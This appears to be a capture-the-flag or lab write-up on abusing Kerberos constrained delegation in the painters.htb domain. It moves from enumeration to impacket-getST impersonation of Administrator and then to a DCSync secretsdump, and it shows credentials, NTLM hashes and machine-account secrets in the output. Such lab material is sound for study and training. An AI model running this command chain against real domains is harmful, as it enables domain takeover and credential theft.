# AllowToDelegate

**Constrained Delegation Abuse (S4U2Self + S4U2Proxy)**

Think of it as a two-step con:

**Step 1 — S4U2Self ("make me a fake badge"):** Your account asks the KDC for a ticket to itself, but pretending to be Administrator. The KDC just hands it over — **no check performed** here, since this feature exists so services can pre-auth users.

**Step 2 — S4U2Proxy ("cash in the badge"):** You hand that fake-Administrator ticket back to the KDC and ask for a ticket to a _specific_ service (like `CIFS/dc.painters.htb`). This time the KDC **does check** — it looks at your account's `msDS-AllowedToDelegateTo` list. If that SPN is on the list, you get a real ticket to that service, as Administrator.

**End result:** You now have access to that one service as Administrator, without ever knowing Administrator's password.

AllowedToDelegate on DC.Painters.htb

<figure><img src="../../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Now we can see that user blake has AllowedToDelegate on DC or we can verify it manually without bloodhound

{% code overflow="wrap" %}
```bash
bloodyAD --host dc.painters.htb -d painters.htb -u blake -p 'P@ssw0rd' --dc-ip 192.168.110.55 get object blake --attr msDS-AllowedToDelegateTo

distinguishedName: CN=Blake Morris,CN=Users,DC=painters,DC=htb
msDS-AllowedToDelegateTo: CIFS/dc.painters.htb; CIFS/DC
```
{% endcode %}

we can also confirm it via nxc command&#x20;

{% code overflow="wrap" %}
```bash
nxc ldap 192.168.110.55 -u blake -p P@ssw0rd --find-delegation
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/Screenshot 2026-07-03 at 9.12.11 in the morning.png" alt=""><figcaption></figcaption></figure>

To exploit&#x20;

{% code overflow="wrap" %}
```bash
impacket-getST -spn CIFS/dc.painters.htb -impersonate Administrator -dc-ip 192.168.110.55 'PAINTERS.HTB/blake:P@ssw0rd'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@CIFS_dc.painters.htb@PAINTERS.HTB.ccache

```
{% endcode %}

Confirm credential success&#x20;

{% code overflow="wrap" %}
```bash
export KRB5CCNAME=Administrator@CIFS_dc.painters.htb@PAINTERS.HTB.ccache ; nxc smb dc.painters.htb -k --use-kcache
SMB         dc.painters.htb 445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:painters.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.painters.htb 445    DC               [+] PAINTERS.HTB\Administrator from ccache (Pwn3d!)
```
{% endcode %}

Then we can DCSync

{% code overflow="wrap" %}
```bash
export KRB5CCNAME=Administrator@CIFS_dc.painters.htb@PAINTERS.HTB.ccache                                             
impacket-secretsdump dc.painters.htb -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
<>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
PAINTERS\DC$:plain_password_hex:f1e223bb02500686631057a53dbbbff423ebc5664b1cd267bd081b768d2cbcb9938882e143b530ba28156026d9903257f2ced1173a6795809e3e3d36bda4c236804cab3bb70eecaadd196afe757493262552fb6e38646fc87845d5ac55b55e50ffd399e1ed6cec8bb8efc7144904701586b9f3c93011be4d1c466e5b90585ac8175ef10d2b27ae87b7c763b0e3425325b43140c634e2faa952ae80163e4b296d13bcf0446c75907775a72820caf741a7d35e978cbdbc6daa559b5513783ba258b7604263686767bbb263df03e758aa8806122808a157172684d80547c0945c1dcfb348e0d5a54d2d1334da4f8075898f
<SNIP>

```
{% endcode %}

